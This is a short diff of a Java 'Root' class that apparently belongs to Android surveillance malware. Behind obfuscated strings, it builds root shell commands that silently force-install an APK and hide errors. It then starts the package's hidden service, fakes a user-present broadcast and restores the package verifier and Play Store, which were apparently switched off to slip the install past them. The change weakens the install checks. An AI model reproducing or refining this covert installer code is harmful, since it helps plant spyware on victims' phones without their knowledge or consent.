@@ -466,14 +466,14 @@ public class Root {
 		command += M.e("sleep 1") + "\n";
 		command += String.format(M.e("cat %s > ") + perPkg, apkPosition) + "\n";
 		command += M.e("chmod 644 ") + perPkg + "\n";
-		command += String.format(M.e("[ -s %s ] && pm install -r -f "), perPkg) + perPkg + "\n";
+		command += String.format(M.e("pm install -r -f %s 2>/dev/null"), perPkg) + "\n";
 		command += M.e("sleep 1") + "\n";
 
 		command += M.e("installed=$(pm list packages ") + packageName + ")\n";
-		command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
+		//command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
 		command += M.e("am startservice ") + packageName + M.e("/.ServiceMain") + "\n";
 		command += M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
-		command += M.e("fi") + "\n";
+		//command += M.e("fi") + "\n";
 		command += M.e("sleep 2") + "\n";
 		command += M.e("settings put global package_verifier_enable 1") + "\n";
 		command += M.e("pm enable com.android.vending") + "\n";
